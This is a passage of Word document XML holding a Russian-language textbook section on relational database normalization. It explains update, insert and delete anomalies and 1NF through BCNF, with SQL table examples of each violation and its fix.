      </w:pPr>
      <w:r>
        <w:t>**Дублирование данных (Избыточность)**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Клиент сделал 10 заказов → его имя, email, адрес записаны 10 раз.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохо:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Занимает больше места, медленнее работает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аномалия обновления (Update Anomaly)**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Клиент изменил адрес → надо обновить все 10 строк.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохо:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если обновишь только 9, будет несогласованность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аномалия вставки (Insert Anomaly)**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Хочешь добавить клиента без заказа → нельзя, потому что таблица называется `orders`.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохо:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Приходится городить ещё одну таблицу или вставлять строку с NULL в `order_id`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аномалия удаления (Delete Anomaly)**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Клиент отменил единственный заказ → удалишь строку → потеряешь всю информацию о клиенте.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохо:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Данные исчезают безвозвратно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Неатомарность**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Поля `items` и `prices` содержат списки через запятую.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохо:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Невозможно эффективно искать ("Найти все заказы с носками").</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.4. Нормализация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс организации данных в БД, при котором:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Устраняется избыточность (дублирование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Устраняются аномалии вставки, обновления, удаления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные становятся логически согласованными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормальные формы (Normal Forms, NF)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это правила, которым должна удовлетворять структура таблиц. Чем выше нормальная форма, тем меньше проблем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Основные нормальные формы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**1НФ (Первая нормальная форма)** — атомарность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**2НФ (Вторая нормальная форма)** — нет частичных зависимостей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**3НФ (Третья нормальная форма)** — нет транзитивных зависимостей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Также существуют:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**BCNF (Бойса-Кодда)** — усиленная 3НФ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**4НФ** — нет многозначных зависимостей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**5НФ** — нет зависимостей соединения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но на практике </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>достаточно 3НФ</w:t>
      </w:r>
      <w:r>
        <w:t>. Дальше уже параноя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.4.1. Первая нормальная форма (1НФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Все атрибуты должны быть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>атомарными</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (неделимыми), и не должно быть повторяющихся групп.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что запрещено:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ Списки через запятую: `items = "Носки, Трусы, Майка"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ Массивы: `phones = ["123", "456", "789"]`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ Несколько значений в одном поле: `адрес = "Москва, ул. Ленина, д.10, кв.5"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>❌ Повторяющиеся столбцы: `телефон1`, `телефон2`, `телефон3`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример нарушения 1НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Плохо</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_bad (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    items TEXT  -- "Носки, Трусы, Майка" ❌ Неатомарно!</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как привести к 1НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вариант 1: Разбить на строки (повторить данные о заказе для каждого товара)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- 1НФ: Каждый товар — отдельная строка</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Данные:</w:t>
        <w:br/>
        <w:t>| order_id | customer_name | item   |</w:t>
        <w:br/>
        <w:t>|----------|---------------|--------|</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | Носки  |</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | Трусы  |</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | Майка  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Но тут ещё не 2НФ, потому что `customer_name` дублируется. Об этом ниже.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вариант 2: Создать отдельную таблицу для товаров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица заказов</w:t>
        <w:br/>
        <w:t>CREATE TABLE order (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров в заказе</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, item)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.4.2. Вторая нормальная форма (2НФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Таблица находится в 1НФ, и каждый </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>неключевой атрибут полностью зависит от первичного ключа</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда возникает проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если первичный ключ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>составной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, и некоторые атрибуты зависят только от </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>части ключа</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример нарушения 2НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- 1НФ, но не 2НФ</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),  -- Зависит только от order_id</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_price INT,             -- Зависит только от item</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, item)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`customer_name` зависит только от `order_id` (не от `item`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`item_price` зависит только от `item` (не от `order_id`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>частичная зависимость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут зависит только от части составного ключа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как привести к 2НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разбить на три таблицы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица заказов</w:t>
        <w:br/>
        <w:t>CREATE TABLE order (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров</w:t>
        <w:br/>
        <w:t>CREATE TABLE item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50) PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_price INT</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица связи "заказ-товар"</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, item_name),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (order_id) REFERENCES order(order_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (item_name) REFERENCES item(item_name)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь каждый атрибут зависит от </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всего</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> первичного ключа своей таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.4.3. Третья нормальная форма (3НФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Таблица находится в 2НФ, и каждый </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>неключевой атрибут не зависит транзитивно от первичного ключа</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Транзитивная зависимость:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> A → B → C. Если атрибут C зависит от B, а B зависит от A, то C транзитивно зависит от A.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример нарушения 3НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- 2НФ, но не 3НФ</w:t>
        <w:br/>
        <w:t>CREATE TABLE student (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    city VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    zip_code VARCHAR(10)  -- Транзитивная зависимость!</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`zip_code` зависит от `city`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`city` зависит от `student_id`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Значит, `zip_code` транзитивно зависит от `student_id`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему плохо:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если в городе изменится почтовый индекс, придётся обновлять все строки студентов из этого города</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если у нас нет студентов из города X, мы не можем сохранить информацию о его индексе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как привести к 3НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица студентов</w:t>
        <w:br/>
        <w:t>CREATE TABLE student (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    city_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (city_id) REFERENCES city(city_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица городов</w:t>
        <w:br/>
        <w:t>CREATE TABLE city (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    city_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    city_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    zip_code VARCHAR(10)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь `zip_code` зависит только от `city_id`, а не транзитивно через `student_id`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.4.4. Нормальная форма Бойса-Кодда (BCNF)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Таблица находится в 3НФ, и для каждой функциональной зависимости X → Y атрибут X должен быть суперключом (т.е. содержать первичный ключ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда возникает проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Редко, но бывает, что в таблице несколько потенциальных ключей, и они перекрываются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (из классики):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица "Студент-Курс-Преподаватель"</w:t>
        <w:br/>
        <w:t>CREATE TABLE enrollment (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    instructor_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (student_id, course_name)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предположение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Каждый курс ведёт только один преподаватель, но преподаватель может вести несколько курсов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зависимости:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`(student_id, course_name) → instructor_name` (первичный ключ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`course_name → instructor_name` (курс определяет преподавателя)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `instructor_name` зависит от `course_name`, но `course_name` не является суперключом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение (BCNF):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица курсов и преподавателей</w:t>
        <w:br/>
        <w:t>CREATE TABLE course (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_name VARCHAR(50) PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    instructor_name VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица студентов на курсах</w:t>
        <w:br/>
        <w:t>CREATE TABLE enrollment (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (student_id, course_name),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (course_name) REFERENCES course(course_name)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>На практике:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> BCNF редко нужна. 3НФ достаточно для 99% случаев.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.5. Примеры нормализации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Интернет-магазин (от UNF до 3НФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Исходная таблица (UNF — Unnormalized Form):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| order_id | customer_name | customer_email   | items              | prices        |</w:t>
        <w:br/>
        <w:t>|----------|---------------|------------------|--------------------|---------------|</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | ivan@mail.ru     | Носки,Трусы,Майка  | 150,200,300   |</w:t>
        <w:br/>
        <w:t>| 2        | Петров        | petr@mail.ru     | Трусы              | 200           |</w:t>
        <w:br/>
        <w:t>| 3        | Иванов        | ivan@mail.ru     | Носки              | 150           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неатомарность (`items` и `prices` — списки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дублирование (`Иванов` и `ivan@mail.ru` повторяются)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 1: Приведение к 1НФ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разбиваем списки на строки:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
